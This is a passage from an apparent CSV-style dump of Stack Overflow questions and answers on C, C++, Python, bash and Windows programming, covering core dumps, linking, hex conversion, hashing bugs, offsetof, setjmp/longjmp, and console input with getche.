<p>This lets you put the data inline in your shell script.  The string <code>EOF</code> can be whatever you want, so just pick any string that doesn't appear in your input on a single line by itself.</p>
"
"<p>A C++ program crashed on FreeBSD 6.2 and OS was kind enough to create a core dump. Is it possible to amputate some stack frames, reset the instruction pointer and restart the process in gdb, and how?</p>
","9530","","<p>Yes, gdb can debug core dumps just as well as running programs.  Assuming that <code>a.out</code> is the name of your program's executable and that <code>a.core</code> is the name of your core file, invoke gdb like so:</p>

<pre><code>gdb a.out a.core
</code></pre>

<p>And then you can debug like normal, except you cannot continue execution in any way (even if you could, the program would just crash again).  You can examine the stack trace, registers, memory, etc.</p>
"
"<p>I'm using CodeBlocks and trying to link SDL_ttf when compiling my program. I have followed thus instructions: </p>

<pre><code>Add ""-lSDL_ttf"" in the linker command line
Put SDL_ttf.dll in library directory
Put SDL_ttf.h in include file directory
</code></pre>

<p>And I have this error when compiling: </p>

<pre><code>ld.exe||cannot find -lSDL_ttf|
||=== Build finished: 1 errors, 0 warnings ===|
</code></pre>

<p>I've tried so many methods to solve this and I feel like banging my head against a brick wall.</p>

<p>I'm running Windows and I have moved the .dll to my system32 as well as the project folder and put the header files in my compilers includes folder. </p>
","9530","","<p>You also need the <code>.lib</code> file to link against.  Put the <code>.lib</code> file in your library directory; you may also need to add that directory to your linker's search path with the <code>-L &lt;path&gt;</code> option.</p>
"
"<p>I have this binary file on my linux system ..</p>

<pre><code> udit@udit-Dabba ~ $ cat file.enc
 Salted__s�bO��&lt;0�F���Jw!���]�:`C�LKȆ�l
</code></pre>

<p>Using hexdump command I see its information like this ..</p>

<pre><code> udit@udit-Dabba ~ $ hexdump -C file.enc
 00000000  53 61 6c 74 65 64 5f 5f  1b 73 a1 62 4f 15 be f6  |Salted__.s.bO...|
 00000010  3c 30 cc 46 ee 10 13 11  84 bf 4a 77 21 a4 84 99  |&lt;0.F......Jw!...|
 00000020  0e 5d ef 11 18 3a 60 43  a0 4c 4b 1e c8 86 e6 6c  |.]...:`C.LK....l|
 00000030
</code></pre>

<p>Now i am given a file on some other system whose contents are like this ..</p>

<pre><code> 53 61 6c 74 65 64 5f 5f  1b 73 a1 62 4f 15 be f6 
 3c 30 cc 46 ee 10 13 11  84 bf 4a 77 21 a4 84 99 
 0e 5d ef 11 18 3a 60 43  a0 4c 4b 1e c8 86 e6 6c
</code></pre>

<p>and I need to find out that same exact binary information from this hexdump.</p>

<p>How to proceed for that ?? </p>

<p>If there is no switch for that then a C code will also work fine.</p>

<p>(but a linux command with some switch is preferable)</p>

<p><strong>LIMITATION :</strong></p>

<p>The binary information in the file is output of an encryption algo so contents should exactly match ..</p>

<p>Thanx in advancne ..</p>
","9530","","<p>As @user786653 suggested, use the <a href=""http://www.manpagez.com/man/1/xxd/""><code>xxd(1)</code></a> program:</p>

<pre><code>xxd -r -p input.txt output.bin
</code></pre>
"
"<p>I have the following code</p>

<pre><code>import ctypes
pBuf = ctypes.cdll.msvcrt.malloc(nBufSize)
# wrote something into the buffer
</code></pre>

<p>How do I save the content of the buffer to a file using Python 2.5?</p>

<p>As you may already know, this is not going to work, giving <code>TypeError: argument 1 must be string or read-only buffer, not int</code>:</p>

<pre><code>f = open(""out.data"",""wb""
f.write(pBuf)
</code></pre>
","9530","","<p>Cast the buffer into a pointer to a byte array, and then get the value from that.  Also, if you're on a 64-bit system, you'll need to make sure to set the return type of <code>malloc</code> to a <code>c_void_p</code> (not the default <code>int</code>) so that the return value doesn't lose any bits.</p>

<p>You'll also need to be careful, in case there are embedded NULs in your data -- you can't just convert the pointer into a <code>c_char_p</code> and convert that into a string (which is especially true if your data isn't NUL-terminated at all).</p>

<pre><code>malloc = ctypes.dll.msvcrt.malloc
malloc.restype = ctypes.c_void_p

pBuf = malloc(nBufSize)
...
# Convert void pointer to byte array pointer, then convert that to a string. 
# This works even if there are embedded NULs in the string.
data = ctypes.cast(pBuf, ctypes.POINTER(ctypes.c_ubyte * nBufSize))
byteData = ''.join(map(chr, data.contents))

with open(filename, mode='wb') as f:
    f.write(byteData)
</code></pre>
"
"<p>I am working at an OS independent file manager, and I am having a problem with properly detecting if a file is a directory or not on Windows.
The <code>dirent</code> structure on windows doesn't appear to have a <code>DT_DIR</code> field, so I am using:</p>

<pre><code>file_attributes=GetFileAttributes(ep-&gt;d_name);
if(file_attributes &amp; FILE_ATTRIBUTE_DIRECTORY)files_list[i].is_dir=1;
else files_list[i].is_dir=0;
</code></pre>

<p>However, this is not always accurate, as some files are marked as directories (for example, pagefile.sys). Besides, <code>GetFileAttributes</code> is rather slow if you have a lot of files.</p>

<p>I also have a function:</p>

<pre><code>int does_dir_exist(char *path)
{
DIR *dp_test;

dp_test = opendir(path);
if(dp_test)
    {
        return 1;
        closedir(dp_test);
    }

return 0;
  }
</code></pre>

<p>But this is pretty slow (won't be a good idea to do it on 10000 files).</p>

<p>Of course, I can combine both which would be pretty fast, but is there a better way?</p>

<p>P.S. For some reason can't format the code properly for the second function.</p>
","9530","","<p>Just use <code>GetFileAttributes()</code>.  <code>opendir</code> and <code>closedir</code> are not going to faster (did you profile it?  Did you repeat your tests to avoid cache effects?).</p>

<p>Yes, <code>GetFileAttributes()</code> <em>is</em> accurate.  The reason you think it's failing is because when you try to get the attributes of <code>pagefile.sys</code>, it's failing and returning <code>INVALID_FILE_ATTRIBUTES</code>, which is <code>(DWORD)-1</code>.  When you test that with the <code>FILE_ATTRIBUTE_DIRECTORY</code>, it returns true, because <code>-1</code> has every bit set in it.</p>

<p>How many files are you running this on?  Whatever function you use, this is going to be an I/O-bound operation, since in order to determine a file's attributes, the parent directory has to be read from disk (or the disk cache).</p>
"
"<p>I'm trying to write a C function using OpenSSL/libcrypto to calculate the SHA256 sum of a file. I'm basing my code on Adam Lamer's c++ example <a href=""http://adamlamers.com/?p=5"" rel=""nofollow"">here</a>.</p>

<p>Here's my code:</p>

<pre><code>int main (int argc, char** argv)
{
    char calc_hash[65];

    calc_sha256(""file.txt"", calc_hash);
}

int calc_sha256 (char* path, char output[65])
{
    FILE* file = fopen(path, ""rb"");
    if(!file) return -1;

    char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    SHA256_Init(&amp;sha256);
    const int bufSize = 32768;
    char* buffer = malloc(bufSize);
    int bytesRead = 0;
    if(!buffer) return -1;
    while((bytesRead = fread(buffer, 1, bufSize, file)))
    {
        SHA256_Update(&amp;sha256, buffer, bytesRead);
    }
    SHA256_Final(hash, &amp;sha256);

    sha256_hash_string(hash, output);
    fclose(file);
    free(buffer);
    return 0;
}      

void sha256_hash_string (char hash[SHA256_DIGEST_LENGTH], char outputBuffer[65])
{
    int i = 0;

    for(i = 0; i &lt; SHA256_DIGEST_LENGTH; i++)
    {
        sprintf(outputBuffer + (i * 2), ""%02x"", hash[i]);
    }

    outputBuffer[64] = 0;
}
</code></pre>

<p>The problem is this....take a look at the calculated sums below for an example file:</p>

<pre><code>Known good SHA256: 6da032d0f859191f3ec46a89860694c61e65460d54f2f6760b033fa416b73866
Calc. by my code:  6dff32ffff59191f3eff6affff06ffff1e65460d54ffff760b033fff16ff3866
</code></pre>

<p>I also get * stack smashing detected * when the code is finished executing.</p>

<p>Does anyone see what I'm doing wrong?</p>

<p>Thanks!</p>
","9530","","<p>You're printing out a <em>signed</em> <code>char</code> as an integer.  If the byte is negative, it get's converted to a <code>signed int</code> (the <em>default argument promotions</em> in the call to <code>sprintf</code>), and then that gets converted to an <code>unsigned int</code> (via the <code>%x</code> format specifier) and printed out.</p>

<p>So, the byte <code>A0</code> is -96 as a signed byte, which gets converted to -96 as a <code>signed int</code>, which is 0xFFFFFFA0 in hex, so it gets printed out as FFFFFFA0.</p>

<p>To fix this, case each byte to an <code>unsigned char</code> before printing:</p>

<pre><code>sprintf(..., (unsigned char)hash[i]);
</code></pre>

<p>You're getting the warning about stack smashing because there's a signed byte near the end of the hash, so you're writing the 8 bytes FFFFFFB7 at offset 58 when you intended to only write 2 bytes.  This results in a <a href=""http://en.wikipedia.org/wiki/Buffer_overflow""><em>buffer overflow</em></a>, which happens to be detected here because the compiler likely inserted a guard area or security cookie in the stack before the return value, and it detected that that guard area was inadvertently modified.</p>
"
"<p>following code is copied from Stig Brautaset JSON library - I removed the comments to be more clear.</p>

<pre><code>@interface NSString (NSString_SBJSON)

- (id)JSONFragmentValue;
- (id)JSONValue;

@end
</code></pre>

<p>I have a crash when I call:</p>

<pre><code>NSString *jsonString = [request responseString];
...
NSDictionary *results = [jsonString JSONValue];//here is the crash with invalid selector.
</code></pre>

<p>I added this:</p>

<pre><code>if (![jsonString respondsToSelector:@selector(JSONValue)]) 
{
   NSLog(@""fix this!!!\n"");
}
</code></pre>

<p>and the message is shown. Do you have any idea why this function in not called? </p>

<p>Thanks!</p>

<p>EDIT: I compile JSON framework as a static lib. The call is made in the same lib.
When I compile it as exe it runs without any problem.</p>
","9530","","<p>You need to both link your static library and your final executable with the <code>-ObjC</code> linker option.</p>

<p>The <code>-JSONValue</code> method is implemented as a <em>category</em> on the <code>NSString</code> class in the file <code>NSString+SBJSON.m</code> file.  Because of how the dynamic runtime works in Objective-C, categories defined in static libraries don't get loaded up unless you link with the <code>-Objc</code> flag.  If the category doesn't get loaded, then dynamic binding fails, and you get the dreaded ""doesn't respond to selector"" exception.</p>
"
"<p>I found the following semaphore example. I'm currently learning about thread syncing. I have few questions.</p>

<p>1) If a semaphore is initilized with a value of zero and I call semaphore_down is the semaphores values now -1 or does semaphore_down simply check if the value is greater than zero then block?</p>

<p>2) I'm coding for IOS and there is no semaphore_down function avaiable. What is the equivelent? Is it the same as semaphore_wait?</p>

<p>I want to have a producer thread running for ever, waiting when it does not need to produce and waking when it does without blockin other threads. </p>

<p>This seems like what I need but suggestions are welcome.</p>

<pre><code> void reader_function(void);
    void writer_function(void);
    char buffer;
    Semaphore writers_turn;
    Semaphore readers_turn;
    main()
    {
    pthread_t reader;
    semaphore_init( &amp;readers_turn );
    semaphore_init( &amp;writers_turn );
    /* writer must go first */
    semaphore_down( &amp;readers_turn );
    pthread_create( &amp;reader, pthread_attr_default,
    (void *)&amp;reader_function, NULL);
    writer_function();
    }
    void writer_function(void)
    {
    while(1)
    {
    semaphore_down( &amp;writers_turn );
    buffer = make_new_item();
    semaphore_up( &amp;readers_turn );
    }
    }
    void reader_function(void)
    {
    while(1)
    {
    semaphore_down( &amp;readers_turn );
    consume_item( buffer );
    semaphore_up( &amp;writers_turn );
    }
    }
</code></pre>
","9530","","<p>If you attempt to wait on a semaphore with a value of 0, it will never go negative -- it will always block until another thread posts to the semaphore to increment it, at which point your thread will wake up and decrement it.</p>

<p>What semaphore library are you using?  A semaphore object generally only supports two operations: <em>post</em> and <em>wait</em>, and optionally also initialization and deinitialization methods.  So, based on the names, your <code>semaphore_wait</code> <em>should</em> be the same as <code>semaphore_down</code>, but it's impossible to say without seeing your semaphore library's documentaiton.</p>

<p>iOS also has <a href=""http://linux.die.net/man/7/sem_overview"" rel=""nofollow"">POSIX semaphores</a>, which you could use instead.</p>
"
"<p>I've been working with C for a while and am reasonably proficient at simple command-line interfaces. I've also had a play with the <code>curses</code> library, for terminal applications that do more than write text to <code>stdout</code>. However, I can't figure out where the half-way point is - applications like <code>wget</code> or <code>make</code> have, for example, the ability to update the text they have output (like <code>wget</code>'s bouncing download meter and progress bar), without taking over the entire screen.</p>

<p>Is this sort of interface something I should be using <code>curses</code> for, or is there a step in between? Preferably one that is cross-platform.</p>
","9530","","<p>You can do some simple things by just printing backspace characters <code>'\b'</code> and raw carriage returns <code>'\r'</code> (without newlines).  Backspaces move the cursor backwards one character, allowing you to overwrite your output, and carriage returns move the cursor back to the start of the current line, allowing you to overwrite the current line.</p>

<p>Here's a simple example of a progress bar:</p>

<pre><code>int progress = 0;
while(progress &lt; 100)
{
    // Note the carriage return at the start of the string and the lack of a
    // newline
    printf(""\rProgress: %d%%"", progress);
    fflush(stdout);

    // Do some work, and compute the new progress (0-100)
    progress = do_some_work();
}
printf(""\nDone\n"");
</code></pre>

<p>Note that you should only do this if you're writing to an actual terminal (as opposed to being redirected to a file or pipe).  You can test for that with <code>if(isatty(fileno(stdout)) { ... }</code>.  Of course, the same would be true if you were using any other library such as curses or ncurses.</p>
"
"<p>How to find find anagrams among words, which are given in a file. </p>

<p>My solution: </p>

<p>Sort them and then find duplicates. </p>

<p>O(n mlgm). 
n: number of words, m : max size of the word</p>

<p>Any better solutions ? </p>

<p>thanks</p>
","9530","","<p>Hash all of the words using a hash function that is invariant under permutations of a word, e.g. compute the frequency count of each letter and hash that array.  Put these in a hash table and look for entries that hash to the same value (of course, you still have to test if those collisions are actual anagrams, due to the nature of hash tables).</p>

<p>That should run in O(n) time, assuming you choose a good hash function and your input set does not contain too many anagrams (in the worst case, if every word is an anagram of every other word, this runs in O(n<sup>2</sup>) time).</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/713963/why-does-this-c-code-work"">Why does this C code work?</a><br>
  <a href=""http://stackoverflow.com/questions/7180290/how-do-you-use-offsetof-on-a-struct"">How do you use offsetof() on a struct?</a>  </p>
</blockquote>



<p>I read about this offsetof macro on the net, but it doesn't explain what it is used for.</p>

<pre><code>#define offsetof(a,b) ((int)(&amp;(((a*)(0))-&gt;b)))
</code></pre>

<p>What is it trying to do and what is the advantage of using it?</p>
","9530","","<p>It's finding the byte offset of a particular member of a <code>struct</code>.  For example, if you had the following structure:</p>

<pre><code>struct MyStruct
{
    double d;
    int i;
    void *p;
};
</code></pre>

<p>Then you'd have <code>offsetOf(MyStruct, d) == 0</code>, <code>offsetOf(MyStruct, i) == 8</code>, and <code>offsetOf(MyStruct, p) == 12</code> (that is, the member named <code>d</code> is 0 bytes from the start of the structure, etc.).</p>

<p>The way that it works is it pretends that an instance of your structure exists at address 0 (the <code>((a*)(0))</code> part), and then it takes the address of the intended structure member and casts it to an integer.  Although dereferencing an object at address 0 would ordinarily be an error, it's ok to take the address because the address-of operator <code>&amp;</code> and the member dereference <code>-&gt;</code> cancel each other out.</p>

<p>It's typically used for generalized serialization frameworks.  If you have code for converting between some kind of wire data (e.g. bytes in a file or from the network) and in-memory data structures, it's often convenient to create a mapping from member name to member offset, so that you can serialize or deserialize values in a generic manner.</p>
"
"<p>I have a question about the buffering in standard library for I/O:
I read ""The Linux Programming Interface"" chapter 13 about File I/O buffering, the author mentioned that standard library used I/O buffering for disk file and terminal.
My question is that does this I/O buffering also apply to FIFO, pipe, socket and network file?</p>
","9530","","<p>No.  Anything that's an ordinary file descriptor (such as those returned by <code>open(2)</code>, <code>pipe(2)</code>, <code>socket(2)</code>, and <code>accept(2)</code>) is not buffered—any data you read or write to it is input or output immediately via direct system calls.</p>

<p>Buffering only happens when you have <code>FILE*</code> objects, which you can get by <code>fopen(3)</code>'ing a regular disk file; the objects <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> are also <code>FILE*</code> objects that are setup at program start.  Buffering is usually enabled on <code>FILE*</code> objects, but not always—it can be disabled with <a href=""http://linux.die.net/man/3/setbuf"" rel=""nofollow""><code>setbuf(3)</code></a>, and <code>stderr</code> is unbuffered by default.</p>

<p>If you want to create a buffered stream out of a regular file descriptor, you can do so with <a href=""http://linux.die.net/man/3/fdopen"" rel=""nofollow""><code>fdopen(3)</code></a>.</p>
"
"<p>Whenever I try to compile the following program, I get this message from the compiler (g++ 4.4.3). Any idea, why? </p>

<pre><code>main.cpp: In function ‘int main(int, char**)’:
main.cpp:52: error: void value not ignored as it ought to be
</code></pre>

<p>Line 52 has the code <strong>rc = pthread_create_with_stack( &amp;thread[t], BusyWork, t );</strong></p>

<pre><code>#include &lt;pthread.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;math.h&gt;
#define NUM_THREADS 4

void *stackAddr[NUM_THREADS];
pthread_t thread[NUM_THREADS];
pthread_attr_t attr;

void *BusyWork(void *t)
{
   int i;
   long tid;
   double result=0.0;
       tid = (long)t;
   printf(""Thread %ld starting...\n"",tid);
   for ( i = 0; i &lt; 1000; i++)
   {
      result = result + sin(i*tid) * tan(i*tid);
   }
   printf(""Thread %ld done. Result = %e\n"", tid, result);
   pthread_exit((void*) t);
}

void pthread_create_with_stack( pthread_t * pthread, void *(*start_routine) (void *), int tid )
{
    const size_t STACKSIZE = 0xC00000; //12582912
    int rc;
    size_t i;
    pid_t pid;

    stackAddr[tid] = malloc(STACKSIZE);
    pthread_attr_setstack(&amp;attr, stackAddr[tid], STACKSIZE);

    rc = pthread_create( pthread, &amp;attr, start_routine, (void*)0 );
}

int main (int argc, char *argv[])
{
   int rc;
   long t;
   void *status;

   /* Initialize and set thread detached attribute */
   pthread_attr_init(&amp;attr);
   pthread_attr_setdetachstate(&amp;attr, PTHREAD_CREATE_JOINABLE);

   for(t=0; t&lt;NUM_THREADS; t++) 
   {
      printf(""Main: creating thread %ld\n"", t);
      // The following line is the line 52, where error occurs
      rc = pthread_create_with_stack( &amp;thread[t], BusyWork, t ); 
      if (rc) 
      {
         printf(""ERROR; return code from pthread_create() is %d\n"", rc);
         exit(-1);
      }
   }

   /* Free attribute and wait for the other threads */
   pthread_attr_destroy(&amp;attr);
   for(t=0; t&lt;NUM_THREADS; t++) 
   {
      rc = pthread_join(thread[t], &amp;status);
      if (rc) 
      {
         printf(""ERROR; return code from pthread_join() is %d\n"", rc);
         exit(-1);
      }
      printf(""Main: completed join with thread %ld having a status""   
            ""of %ld\n"",t,(long)status);
    }

    printf(""Main: program completed. Exiting.\n"");
    pthread_exit(NULL);
}
</code></pre>
","9530","","<p>Yes, there is an error.  A return type of <code>void</code> means that the function returns no value.  You're trying to assign the return value of <code>pthread_create_with_stack</code> to a local variable, but there is no return value to assign.</p>

<p>You should instead declare <code>pthread_create_with-stack</code> as returning an <code>int</code>, and then make it actually return a value:</p>

<pre><code>int pthread_create_with-stack(...)
{
    ...
    return pthread_create(...);
}
</code></pre>
"
"<p>I tried to create a UDP socket on mingw, but socket() return -1, with errno = 0. Strange. 
I have included winsock2.h.
Initially I had compilation error ""undefined reference to socket@12"", after setting 
-lws2_32 and -lwsock32 to Linker Settings of Code::Block, compilation success.</p>

<pre><code>sockfd = socket(AF_INET, SOCK_DGRAM, 0);
RDF_LOG(kDEBUG, ""sockfd %d "", sockfd);
if (sockfd &lt; 0){
    RDF_LOG(kERROR, ""ERROR: %s , errno %d\n"", strerror(errno), errno);
}
</code></pre>

<p>Result --> 
sockfd -1
ERROR: No error , errno 0</p>

<hr>

<p>OK, I change RDF_LOG to fprintf instead.</p>

<pre><code>int tmp = 0;

sockfd = socket(AF_INET, SOCK_DGRAM, 0);
tmp = errno;
fprintf(stderr, ""sockfd %d "", sockfd);
if (sockfd &lt; 0){
    fprintf(stderr, ""socket: %s , errno %d\n"", strerror(tmp), tmp);
}
</code></pre>

<p>The result returned is, still, -->    sockfd -1 socket: No error , errno 0
Is it possible that mingw does not support errno??</p>
","9530","","<p>The function/macro <code>RDF_LOG</code> is likely calling some other function in the C runtime library that is resetting <code>errno</code> to 0.  You need to capture the value of <code>errno</code> immediately after <code>socket</code> fails in order for it to be accurate.</p>
"
"<p>I'm adding some functionality to an existing code base that uses pure C functions (fopen, fwrite, fclose) to write data out to a file.  Unfortunately I can't change the actual mechanism of file i/o, but I have to pre-allocate space for the file to avoid fragmentation (which is killing our performance during reads).   Is there a better way to do this than to actually write zeros or random data to the file?  I know the ultimate size of the file when I'm opening it.  </p>

<p>I know I can use fallocate on linux, but I don't know what the windows equivalent is.</p>

<p>Thanks!</p>
","9530","","<p>You can use the <a href=""http://msdn.microsoft.com/library/aa365544.aspx"" rel=""nofollow""><code>SetFileValidData</code></a> function to extend the logical length of a file without having to write out all that data to disk.  However, because it can allow to read disk data to which you may not otherwise have been privileged, it requires the <code>SE_MANAGE_VOLUME_NAME</code> privilege to use.  Carefully read the <strong>Remarks</strong> section of the documentation.</p>

<p>I'd recommend instead just writing out the 0's.  You can also use <a href=""http://msdn.microsoft.com/en-us/library/aa365542%28v=VS.85%29.aspx"" rel=""nofollow""><code>SetFilePointerEx</code></a> and <a href=""http://msdn.microsoft.com/en-us/library/aa365531%28v=VS.85%29.aspx"" rel=""nofollow""><code>SetEndOfFile</code></a> to extend the file, but doing so still requires writing out zeros to disk (unless the file is sparse, but that defeats the point of reserving disk space).  See <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2011/09/22/10215053.aspx"" rel=""nofollow"">Why does my single-byte write take forever?</a> for more info on that.</p>
"
"<p>I have a basic bash scripting question. The output of this script, I expected to be:</p>

<p>a
y
b
x
c
y</p>

<p>but instead, I get:</p>

<p>a
x
b
x
c
x</p>

<pre><code>#!/bin/bash                                                                     
for foo in 'a' 'b' 'c'; do
    echo $foo;                                         
    if [ ""$foo""==""b"" ]; then                                                                        
        echo x;                                                                 
    else                                                                        
        echo y;                                                                 
    fi                                                                                                                                                        
done;    
</code></pre>

<p>What am I missing?</p>
","9530","","<p>You need to add spaces around the <code>==</code> operator, otherwise it gets parsed as the single token <code>a==b</code> (after expansion, for the first iteration).  This gets passed to the <code>test</code> builtin (for which <code>[</code> is an alternative name).  Since the single argument <code>a==b</code> is a non-empty string atom, it succeeds and exits with a status of 0, and the <code>then</code> branch gets executed.</p>
"
"<p>After invoking longjmp(), non-volatile-qualified local objects should not be accessed if their values could have changed since the invocation of setjmp(). Their value in this case is considered indeterminate, and accessing them is undefined behavior. </p>

<p>Now my question is why volatile works in this situation? Wouldn't change in that volatile variable still fail the longjmp? For example, how longjmp will work correctly in the example given below? When the code get backs to setjmp after longjmp, wouldn't the value of local_var be 2 instead of 1?</p>

<pre><code>void some_function()
{
  volatile int local_var = 1;

  setjmp( buf );
  local_var = 2;
  longjmp( buf, 1 );
}
</code></pre>
","9530","","<p><code>setjmp</code> and <code>longjmp</code> clobber registers.  If a variable is stored in a register, its value gets lost after a <code>longjmp</code>.</p>

<p>Conversely, if it's declared as <code>volatile</code>, then every time it gets written to, it gets stored back to memory, and every time it gets read from, it gets read back from memory every time.  This hurts performance, because the compiler has to do more memory accesses instead of using a register, but it makes the variable's usage safe in the face of <code>longjmp</code>ing.</p>
"
"<p>From the Python 2.7 docs for<a href=""http://docs.python.org/library/filecmp.html"" rel=""nofollow""><code>filecmp</code></a>it sounds like when two files which are identical except for their <code>os.stat()</code>signature will be considered unequal, however this does not seem to be the case, as the following illustrates:</p>

<pre><code>import filecmp
import os
import shutil
import time

with open('test_file_1', 'w') as f:
    f.write('file contents')
shutil.copy('test_file_1', 'test_file_2')
time.sleep(5)  # pause to get a different time-stamp
os.utime('test_file_2', None)  # change copied file's time-stamp

print 'test_file_1:', os.stat('test_file_1')
print 'test_file_2:', os.stat('test_file_2')
print 'filecmp.cmp():', filecmp.cmp('test_file_1', 'test_file_2')
</code></pre>

<p>Output:</p>

<pre class=""lang-none prettyprint-override""><code>test_file_1: nt.stat_result(st_mode=33206, st_ino=0L, st_dev=0, st_nlink=0,
  st_uid=0, st_gid=0, st_size=13L, st_atime=1320719522L, st_mtime=1320720444L, 
  st_ctime=1320719522L)
test_file_2: nt.stat_result(st_mode=33206, st_ino=0L, st_dev=0, st_nlink=0, 
  st_uid=0, st_gid=0, st_size=13L, st_atime=1320720504L, st_mtime=1320720504L, 
  st_ctime=1320719539L)
filecmp.cmp(): True
</code></pre>

<p>As you can see the two files' time stamps &mdash;<code>st_atime</code>, <code>st_mtime</code>, and<code>st_ctime</code>&mdash; are clearly not the same, yet<code>filecmp.cmp()</code>indicates that the two are identical.  Am I misunderstanding something or is there a bug in either<code>filecmp.cmp()</code>'s implementation or its documentation?</p>

<p>Update:</p>

<p>In Python 3.3, the documentation has been rephrased and now says the following, which IMHO is an improvement only in the sense that it better implies that files with different time stamps might still be considered equal even when<code>shallow</code>is True.</p>

<blockquote>
  <p>If <em>shallow</em> is true, files with identical <a href=""http://docs.python.org/3.3/library/os.html#os.stat"" rel=""nofollow"">os.stat()</a> signatures are
  taken to be equal. Otherwise, the contents of the files are compared.</p>
</blockquote>

<p>FWIW I think it would have be more clear to simply say something like this:</p>

<blockquote>
  <p>If <em>shallow</em> is true, file content is compared only when
  <a href=""http://docs.python.org/3.3/library/os.html#os.stat"" rel=""nofollow"">os.stat()</a>
  signatures are unequal.</p>
</blockquote>
","9530","","<p>You're misunderstanding the documentation.  Line #2 says:</p>

<blockquote>
  <p>Unless <em>shallow</em> is given and is false, files with identical <code>os.stat()</code> signatures are taken to be equal.</p>
</blockquote>

<p>Files with identical <code>os.stat()</code> signatures are taken to be equal, but the <a href=""http://en.wikipedia.org/wiki/Inverse_%28logic%29"" rel=""nofollow"">logical inverse</a> is not true: files with unequal <code>os.stat()</code> signatures are not necessarily taken to be unequal.  Rather, they <em>may</em> be unequal, in which case the actual file contents are compared.  Since the file contents are found to be identical, <code>filecmp.cmp()</code> returns <code>True</code>.</p>

<p>As per the third clause, once it determines that the files are equal, it will cache that result and not bother re-reading the file contents if you ask it to compare the same files again, <em>so long as those files' <code>os.stat</code> structures don't change</em>.</p>
"
"<p>When I compile <a href=""http://fuse.sourceforge.net/helloworld.html"" rel=""nofollow"">this helloworld example</a>, I get the following error repeated 4 times:</p>

<pre><code>error: expected primary-expression before ‘.’ token
</code></pre>

<p>Here is the code:</p>

<pre><code>static struct fuse_operations hello_oper = {
    .getattr    = hello_getattr,
    .readdir    = hello_readdir,
    .open   = hello_open,
    .read   = hello_read,
};

int main(int argc, char *argv[])
{
    return fuse_main(argc, argv, &amp;hello_oper);
}
</code></pre>
","9530","","<p>That syntax is using a new feature of the <a href=""http://en.wikipedia.org/wiki/C99"" rel=""nofollow"">C99 language standard</a> called <em>designated initializers</em>.  That feature is not part of the more common C89 standard (aka ANSI C), so a C89 compiler will give you syntax errors when you try to compile code that uses it.</p>

<p>To fix it, tell your compiler to use its C99 mode if it has one.  For example, if you're using GCC, you should pass the <code>-std=c99</code> compiler option.  If your compiler doesn't support C99 at all, you'll have to either switch to a compiler that does, or refactor the code to avoid using C99 features.</p>
"
"<p>I am attempting to automate the execution of an interactive command line tool written in C++.</p>

<p>When launched, the binary waits for the letter S, Q, or P (Status, Quit, or Pause).  It uses a nonstandard msvcrt function ""getche"" to acquire the key stroke (instead of a gets() for example) without the user having to hit enter.</p>

<p>I tried communicating with the process in the standard way (writing to stdin and using process.communicate[]) but it doesn't get the input.  After a few hours of trying different things I created two small sample projects in Visual Studio to replicate the issue and make sure I am sane(ish).</p>

<p>This is the python script used to call the binary:</p>

<pre><code>import subprocess
import time

cmd = [""test-getch.exe""]
process = subprocess.Popen(cmd, stderr = subprocess.PIPE, stdin = subprocess.PIPE, stdout = subprocess.PIPE)
i = process.stdin
#msvcrt.ungetch('s')
i.write(""S\n"")
print process.communicate()[0]
i.close()
time.sleep(3)
print ""DONE""
</code></pre>

<p>These are the two binaries.  This first one I can communicate with:</p>

<pre><code>#include ""stdafx.h""
#include &lt;conio.h&gt;


int _tmain(int argc, _TCHAR* argv[])
{
    char response [2];
    printf(""Enter \""s\"":\n"");
    gets(response);
    printf(""You entered %s"", response);
    return 0;
}
</code></pre>

<p>This one I can't communicate with:</p>

<pre><code>#include ""stdafx.h""
#include &lt;conio.h&gt;


int _tmain(int argc, _TCHAR* argv[])
{
    int response;
    printf(""Enter \""a\"":\n"");
    response = getche();
    printf(""You entered %c"", response);
    return 0;
}
</code></pre>

<p>It appears that getche() doesn't listen on stdin and probably listens for some kind of keyboard event.  Anyone know how to deal with this?</p>

<p><strong>EDIT:</strong>
I should also mention I discovered the method of capturing input using IDA Pro.  I did not write the original binary that I am attempting to automate.  It is a closed source tool so I have no way of re-writing how it accepts input without patching the binary.</p>

<p>I've actually chosen a rather insane solution that works... I know pydbg quite well and it seems that attaching to the process and calling the functions I need via process instrumentation works.  It's totally overkill but I can detach from the process afterwards. and have it run normally.</p>

<p>[1] Pydbg: <a href=""http://pedram.redhive.com/PyDbg/docs/"" rel=""nofollow"">http://pedram.redhive.com/PyDbg/docs/</a></p>
","9530","","<p><code>getche</code> reads from the <em>console</em>, not from standard input.  If your Python process is running in a console window, then your subprocess will still try reading input from that same console, not the pipe it's being passed in as standard input.</p>

<p>It might be possible to create another invisible console window, attach it to the subprocess, and feed it input, but that's very complicated and error-prone.</p>

<p>I'd recommend instead just rewriting your program to only read from standard input instead of using <code>getche()</code>.  If you <em>really</em> want to have it react to keystrokes without requiring the user to press Enter, then I'd suggest having it change its behavior depending on whether or not standard input is coming from a terminal.  If it is, use <code>getche</code>, and if not, just read directly from <code>stdin</code>.  You can test this using <a href=""http://msdn.microsoft.com/en-us/library/f4s0ddew%28v=VS.90%29.aspx"" rel=""nofollow""><code>_isatty</code></a> (or the POSIX-equivalent <code>isatty</code>; for some reason, Microsoft has decided to deprecate the POSIX name in their runtime).  For example:</p>

<pre><code>int ReadChar()
{
    if(_isatty(0))
    {
        // stdin is a terminal
        return _getche();
    }
    else
    {
        // stdin is not a terminal
        return getchar();
    }
}
</code></pre>
"
"<p>C and C++ have many differences, and not all valid C code is valid C++ code.<br>
(By ""valid"" I mean standard code with defined behavior, i.e. not implementation-specific/undefined/etc.)</p>

<p>Is there any scenario in which a piece of code valid in both C and C++ would produce <em>different</em> behavior when compiled with a standard compiler in each language?</p>

<p>To make it a reasonable/useful comparison (I'm trying to learn something practically useful, not to try to find obvious loopholes in the question), let's assume:</p>

<ul>
<li>Nothing preprocessor-related (which means no hacks with <code>#ifdef __cplusplus</code>, pragmas, etc.)  </li>
<li>Anything implementation-defined is the same in both languages (e.g. numeric limits, etc.)</li>
<li>We're comparing reasonably recent versions of each standard (e.g. say, C++98 and C90 or later)<br>
If the versions matter, then please mention which versions of each produce different behavior.</li>
</ul>
